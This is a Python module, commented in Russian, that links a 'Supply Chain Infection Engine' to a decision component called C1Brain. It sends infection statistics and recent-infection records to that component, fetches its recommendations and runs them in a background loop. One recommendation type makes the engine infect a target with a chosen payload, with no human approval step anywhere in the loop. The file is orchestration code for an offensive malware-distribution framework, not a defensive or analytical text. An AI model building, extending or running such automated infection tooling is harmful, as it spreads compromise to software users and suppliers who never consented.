#!/usr/bin/env python3
"""
Brain Connector - модуль для интеграции Supply Chain Infection Engine с C1Brain
Обеспечивает передачу информации о целях и результатах атак в C1Brain
"""

import json
import logging
import threading
import time
from typing import Dict, List, Any, Optional
from datetime import datetime, timedelta

from src.supply_chain.engine import SupplyChainEngine, SupplyChainTarget, InfectionStatus, TargetType

class BrainConnector:
    """
    Класс для интеграции SupplyChainEngine с C1Brain
    Позволяет передавать информацию о целях и результатах атак в C1Brain
    """
    
    def __init__(
        self,
        engine: SupplyChainEngine,
        brain: Any,
        update_interval: int = 300,
        auto_update: bool = True
    ):
        """
        Инициализация коннектора
        
        Args:
            engine: Экземпляр SupplyChainEngine
            brain: Экземпляр C1Brain для взаимодействия
            update_interval: Интервал автоматического обновления информации в C1Brain (в секундах)
            auto_update: Автоматически обновлять информацию в C1Brain
        """
        self.engine = engine
        self.brain = brain
        self.update_interval = update_interval
        self.auto_update = auto_update
        
        self.running = False
        self.update_thread = None
        self.logger = logging.getLogger("BrainConnector")
        
        # Устанавливаем связь между SupplyChainEngine и C1Brain
        self.engine.set_brain(self.brain)
        self.logger.info("BrainConnector инициализирован")
    
    def start(self) -> None:
        """
        Запускает процесс обновления информации в C1Brain.
        
        Если auto_update=True, запускает фоновый поток для регулярных обновлений.
        В любом случае выполняет начальное обновление информации.
        """
        if self.running:
            self.logger.warning("BrainConnector уже запущен")
            return

        self.running = True
        
        # Сразу отправляем текущую информацию в C1Brain
        try:
            self.update_brain()
            self.logger.info("Начальное обновление C1Brain выполнено")
        except Exception as e:
            self.logger.error(f"Ошибка при начальном обновлении C1Brain: {str(e)}")
        
        # Запускаем поток для обновлений если auto_update включен
        if self.auto_update:
            self.update_thread = threading.Thread(target=self._update_loop, daemon=True)
            self.update_thread.start()
            self.logger.info(f"BrainConnector запущен, интервал обновления: {self.update_interval} сек")
        else:
            self.logger.info("BrainConnector запущен без автоматических обновлений")
    
    def stop(self) -> None:
        """
        Останавливает процесс обновления информации
        
        Returns:
            bool: True если процесс остановлен, иначе False
        """
        if not self.running:
            self.logger.warning("BrainConnector не был запущен")
            return
        
        self.running = False
        
        if self.update_thread:
            self.update_thread.join(timeout=5.0)
            self.update_thread = None
        
        self.logger.info("BrainConnector остановлен")
    
    def _update_loop(self) -> None:
        """Цикл автоматического обновления информации"""
        while self.running:
            try:
                self.update_brain()
                self.logger.debug("Периодическое обновление C1Brain выполнено")
            except Exception as e:
                self.logger.error(f"Ошибка при периодическом обновлении C1Brain: {str(e)}")
            
            # Ждем заданный интервал
            for _ in range(self.update_interval):
                if not self.running:
                    break
                time.sleep(1)
    
    def update_brain(self) -> bool:
        """
        Отправляет актуальную информацию в C1Brain.
        
        Собирает информацию о текущем состоянии SupplyChainEngine и 
        отправляет её в C1Brain. После этого запрашивает рекомендации
        и выполняет их при необходимости.
        
        Returns:
            bool: Успешность операции
        """
        try:
            # Подготавливаем информацию о движке
            engine_info = self._prepare_engine_info()
            
            # Отправляем информацию в C1Brain
            if hasattr(self.brain, 'update_module_info'):
                self.brain.update_module_info('supply_chain', engine_info)
            elif hasattr(self.brain, 'process_module_update'):
                self.brain.process_module_update('supply_chain', engine_info)
            else:
                self.logger.warning("C1Brain не поддерживает методы обновления")
                return False
                
            self.logger.debug("Информация о SupplyChainEngine успешно отправлена в C1Brain")
            
            # Запрашиваем рекомендации от C1Brain
            try:
                recommendations = self.request_actions()
                if recommendations:
                    # Выполняем полученные рекомендации
                    self.execute_recommendations(recommendations)
            except Exception as e:
                self.logger.error(f"Ошибка при запросе/выполнении рекомендаций: {str(e)}")
                
            return True
            
        except Exception as e:
            self.logger.error(f"Ошибка при обновлении информации в C1Brain: {str(e)}")
            return False
    
    def _prepare_engine_info(self) -> Dict[str, Any]:
        """
        Подготавливает информацию о SupplyChainEngine для отправки в C1Brain.
        
        Returns:
            Dict[str, Any]: Структурированная информация о состоянии движка
        """
        # Собираем статистику по целям
        targets_count = len(self.engine.targets)
        
        # Считаем количество целей в разных статусах
        status_counts = {status.value: 0 for status in InfectionStatus}
        type_counts = {target_type.value: 0 for target_type in TargetType}
        
        for target in self.engine.targets.values():
            status_counts[target.status.value] += 1
            type_counts[target.target_type.value] += 1
        
        # Собираем информацию о payloads
        payloads_count = len(self.engine.payloads)
        
        # Собираем информацию о недавних заражениях (за последние 24 часа)
        recent_infections = []
        cutoff_time = datetime.now() - timedelta(days=1)
        
        for target in self.engine.targets.values():
            # Проверяем, было ли заражение недавним
            if hasattr(target, 'infection_date') and target.infection_date:
                infection_date = target.infection_date
                if isinstance(infection_date, str):
                    try:
                        infection_date = datetime.fromisoformat(infection_date)
                    except ValueError:
                        continue
                
                if infection_date > cutoff_time:
                    recent_infections.append({
                        "target_id": target.target_id,
                        "target_type": target.target_type.value,
                        "status": target.status.value,
                        "payload_id": target.payload_id,
                        "infection_date": target.infection_date.isoformat() if hasattr(target.infection_date, 'isoformat') else target.infection_date
                    })
        
        # Формируем общую информацию
        engine_info = {
            "stats": {
                "targets_count": targets_count,
                "payloads_count": payloads_count,
                "status_distribution": status_counts,
                "target_types_distribution": type_counts
            },
            "recent_infections": recent_infections,
            "running": self.engine.running,
            "last_update": datetime.now().isoformat()
        }
        
        return engine_info
    
    def notify_infection(self, infection_info: Dict[str, Any]) -> bool:
        """
        Уведомляет C1Brain о результате заражения.
        
        Отправляет подробную информацию о результате заражения в C1Brain
        для анализа и дальнейших рекомендаций.
        
        Args:
            infection_info: Информация о заражении, включая идентификатор цели,
                          статус, payload и детали результата
        
        Returns:
            bool: Успешность уведомления
        """
        if not self.brain:
            self.logger.warning("C1Brain не зарегистрирован, уведомление не отправлено")
            return False
        
        try:
            # Добавляем дополнительную информацию
            if "timestamp" not in infection_info:
                infection_info["timestamp"] = datetime.now().isoformat()
                
            if "module" not in infection_info:
                infection_info["module"] = "supply_chain"
            
            # Отправляем уведомление в C1Brain
            if hasattr(self.brain, 'process_infection_result'):
                self.brain.process_infection_result(infection_info)
                self.logger.info(f"C1Brain уведомлен о результате заражения цели {infection_info.get('target_id')}")
                return True
            elif hasattr(self.brain, 'process_task_result'):
                # Альтернативный метод через process_task_result
                target_id = infection_info.get('target_id', 'unknown')
                success = infection_info.get('success', False)
                
                result = {
                    "status": "success" if success else "failure",
                    "command": "infect_target",
                    "output" if success else "error": infection_info
                }
                
                self.brain.process_task_result("supply_chain", target_id, result)
                self.logger.info(f"C1Brain уведомлен о результате заражения цели {target_id}")
                return True
            else:
                self.logger.warning("C1Brain не поддерживает методы уведомления о заражении")
                return False
                
        except Exception as e:
            self.logger.error(f"Ошибка при уведомлении C1Brain о результате заражения: {str(e)}")
            return False
    
    def request_actions(self) -> List[Dict[str, Any]]:
        """
        Запрашивает у C1Brain рекомендуемые действия.
        
        Returns:
            List[Dict[str, Any]]: Список рекомендаций для выполнения
        """
        if not self.brain:
            self.logger.warning("C1Brain не зарегистрирован, невозможно запросить рекомендации")
            return []
        
        try:
            # Запрашиваем рекомендации от C1Brain
            if hasattr(self.brain, 'get_recommendations'):
                recommendations = self.brain.get_recommendations('supply_chain')
                if recommendations:
                    self.logger.info(f"Получено {len(recommendations)} рекомендаций от C1Brain")
                return recommendations
            elif hasattr(self.brain, 'get_module_actions'):
                actions = self.brain.get_module_actions('supply_chain')
                if actions:
                    self.logger.info(f"Получено {len(actions)} действий от C1Brain")
                return actions
            else:
                self.logger.warning("C1Brain не поддерживает методы получения рекомендаций")
                return []
        
        except Exception as e:
            self.logger.error(f"Ошибка при запросе рекомендаций от C1Brain: {str(e)}")
            return []
    
    def execute_recommendations(self, recommendations: List[Dict[str, Any]]) -> None:
        """
        Выполняет рекомендации, полученные от C1Brain.
        
        Анализирует список рекомендаций и выполняет соответствующие 
        действия с помощью SupplyChainEngine.
        
        Args:
            recommendations: Список рекомендаций от C1Brain
        """
        if not recommendations:
            return
            
        for rec in recommendations:
            try:
                action_type = rec.get('action') or rec.get('type')
                if not action_type:
                    self.logger.warning(f"Пропуск рекомендации без указания типа действия: {rec}")
                    continue
                
                params = rec.get('params') or rec.get('parameters') or {}
                target_id = params.get('target_id')
                
                if action_type == 'infect_target':
                    # Выполняем заражение цели
                    if not target_id:
                        self.logger.warning("Пропуск рекомендации 'infect_target' без указания target_id")
                        continue
                        
                    payload_id = params.get('payload_id')
                    self.logger.info(f"Выполнение рекомендации: заражение цели {target_id}")
                    
                    result = self.engine.infect_target(target_id, payload_id)
                    
                    # Уведомляем C1Brain о результате
                    if hasattr(self.brain, 'process_recommendation_result'):
                        self.brain.process_recommendation_result(
                            'supply_chain', 
                            rec.get('id', ''), 
                            {'success': result}
                        )
                    
                elif action_type == 'add_target':
                    # Добавляем новую цель
                    target_data = params.get('target_data')
                    target_type = params.get('target_type')
                    
                    if not target_data or not target_type:
                        self.logger.warning("Пропуск рекомендации 'add_target' с неполными параметрами")
                        continue
                        
                    self.logger.info(f"Выполнение рекомендации: добавление новой цели типа {target_type}")
                    
                    # TODO: Реализовать метод add_target в SupplyChainEngine
                    # result = self.engine.add_target(target_type, target_data)
                    
                elif action_type == 'add_payload':
                    # Добавляем новый payload
                    payload_data = params.get('payload_data')
                    
                    if not payload_data:
                        self.logger.warning("Пропуск рекомендации 'add_payload' без данных payload")
                        continue
                        
                    self.logger.info("Выполнение рекомендации: добавление нового payload")
                    
                    # TODO: Реализовать метод add_payload в SupplyChainEngine
                    # result = self.engine.add_payload(payload_data)
                    
                elif action_type == 'scan_targets':
                    # Запускаем сканирование целей
                    self.logger.info("Выполнение рекомендации: сканирование целей")
                    
                    # TODO: Реализовать метод scan_targets в SupplyChainEngine
                    # result = self.engine.scan_targets()
                    
                elif action_type == 'remove_target':
                    # Удаляем цель
                    if not target_id:
                        self.logger.warning("Пропуск рекомендации 'remove_target' без указания target_id")
                        continue
                        
                    self.logger.info(f"Выполнение рекомендации: удаление цели {target_id}")
                    
                    # TODO: Реализовать метод remove_target в SupplyChainEngine
                    # result = self.engine.remove_target(target_id)
                    
                else:
                    self.logger.warning(f"Неизвестный тип рекомендации: {action_type}")
                    
            except Exception as e:
                self.logger.error(f"Ошибка при выполнении рекомендации: {str(e)}") 